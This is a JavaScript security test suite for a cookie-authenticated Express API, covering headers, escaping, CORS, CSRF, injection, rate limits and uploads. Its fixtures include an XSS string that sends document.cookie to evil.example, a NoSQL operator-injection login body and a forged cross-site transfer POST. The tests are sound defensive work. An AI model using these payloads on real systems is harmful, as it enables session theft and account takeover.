// S4: one security review of a cookie-authenticated API: headers, XSS escaping, CORS, CSRF origin check,
// rate limiting, injection by type checks, and upload limits. Browser enforcement itself is not tested here.
import assert from 'node:assert/strict';
import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import multer from 'multer';
import { rateLimit } from 'express-rate-limit';
import { z } from 'zod';
import request from 'supertest';

const ALLOWED = new Set(['https://app.example.com']);
let transfers = 0;

const app = express();
app.use(helmet());
app.use(cors({ origin: (o, cb) => cb(null, ALLOWED.has(o)), credentials: true }));
app.use((req, res, next) => {                       // CSRF: unsafe methods must come from our own origin
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  if (!ALLOWED.has(req.get('Origin'))) return res.status(403).json({ error: 'Bad origin' });
  next();
});
app.use('/api', rateLimit({ windowMs: 60e3, limit: 5, standardHeaders: 'draft-8', legacyHeaders: false }));
app.use(express.json());

const esc = (s) => s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
const comment = '<script>fetch("https://evil.example/?c="+document.cookie)</script>';
app.get('/comments', (req, res) => res.type('html').send(`<p>${esc(comment)}</p>`));
app.get('/login-cookie', (req, res) => res.cookie('sid', 'abc', { httpOnly: true, secure: true, sameSite: 'lax' }).end());
app.post('/api/transfer', (req, res) => { transfers++; res.json({ ok: true }); });

const Login = z.object({ email: z.string().email(), password: z.string().min(1) });
app.post('/api/login', (req, res) => {
  const r = Login.safeParse(req.body);
  if (!r.success) return res.status(400).json({ error: 'Invalid body' });
  res.json({ ok: true });
});

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 1024, files: 1 } });
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
app.post('/upload', upload.single('avatar'), (req, res) => {
  if (!req.file?.buffer.subarray(0, 8).equals(PNG)) return res.status(415).json({ error: 'Not a PNG' });
  res.status(201).json({ size: req.file.size });
});
app.use((err, req, res, next) => res.status(err.code === 'LIMIT_FILE_SIZE' ? 413 : 500).json({ error: err.code }));

// 1. Helmet: CSP blocks inline and foreign scripts, nosniff on, framework fingerprint gone.
const page = await request(app).get('/comments');
assert.match(page.headers['content-security-policy'], /script-src 'self'/);
assert.equal(page.headers['x-content-type-options'], 'nosniff');
assert.equal(page.headers['x-powered-by'], undefined);

// 2. XSS: output escaped for HTML, so the stored script is text, not a tag.
assert.ok(!page.text.includes('<script>'));
assert.ok(page.text.includes('&lt;script&gt;'));

// 3. Auth cookie flags.
const ck = (await request(app).get('/login-cookie')).headers['set-cookie'][0];
assert.match(ck, /HttpOnly/); assert.match(ck, /Secure/); assert.match(ck, /SameSite=Lax/);

// 4. CORS: allowed origin echoed with credentials and Vary; another origin gets no CORS headers.
const ok = await request(app).get('/comments').set('Origin', 'https://app.example.com');
assert.equal(ok.headers['access-control-allow-origin'], 'https://app.example.com');
assert.equal(ok.headers['access-control-allow-credentials'], 'true');
assert.match(ok.headers.vary, /Origin/);
const evilGet = await request(app).get('/comments').set('Origin', 'https://evil.example');
assert.equal(evilGet.headers['access-control-allow-origin'], undefined);
assert.equal(evilGet.status, 200);                 // CORS only hides the response from the browser; the server still answered

// 5. CORS is not CSRF protection: without the origin check, a cross-site form POST would run.
const noCsrf = express(); let ran = 0;
noCsrf.use(cors({ origin: (o, cb) => cb(null, ALLOWED.has(o)), credentials: true }));
noCsrf.post('/api/transfer', (req, res) => { ran++; res.end(); });
await request(noCsrf).post('/api/transfer').set('Origin', 'https://evil.example').type('form').send('to=attacker');
assert.equal(ran, 1);

// 6. CSRF origin check: foreign or missing Origin is refused before the handler runs.
assert.equal((await request(app).post('/api/transfer').set('Origin', 'https://evil.example')).status, 403);
assert.equal((await request(app).post('/api/transfer')).status, 403);
assert.equal(transfers, 0);
assert.equal((await request(app).post('/api/transfer').set('Origin', 'https://app.example.com')).status, 200);
assert.equal(transfers, 1);

// 7. Injection: a Mongo-style operator object instead of a string is rejected by the type check.
const inj = await request(app).post('/api/login').set('Origin', 'https://app.example.com')
  .send({ email: { $ne: null }, password: { $ne: null } });
assert.equal(inj.status, 400);

// 8. Rate limit: 2 /api calls above reached the limiter (the 403s stopped earlier), so the 6th gets 429.
const codes = [];
for (let i = 0; i < 4; i++) codes.push((await request(app).post('/api/transfer').set('Origin', 'https://app.example.com')).status);
assert.deepEqual(codes, [200, 200, 200, 429]);

// 9. Uploads: renamed text is caught by magic bytes, oversized files by the limit, a real PNG header passes.
const fake = await request(app).post('/upload').set('Origin', 'https://app.example.com').attach('avatar', Buffer.from('hello, not an image'), { filename: 'cat.png', contentType: 'image/png' });
assert.equal(fake.status, 415);
const big = await request(app).post('/upload').set('Origin', 'https://app.example.com').attach('avatar', Buffer.concat([PNG, Buffer.alloc(2000)]), { filename: 'big.png', contentType: 'image/png' });
assert.equal(big.status, 413);
const real = await request(app).post('/upload').set('Origin', 'https://app.example.com').attach('avatar', Buffer.concat([PNG, Buffer.alloc(100)]), { filename: 'a.png', contentType: 'image/png' });
assert.equal(real.status, 201);

console.log('S4 ok: helmet headers, escaped output, cookie flags, CORS allowlist, CORS is not CSRF, origin check, operator injection blocked, 429, upload checks');
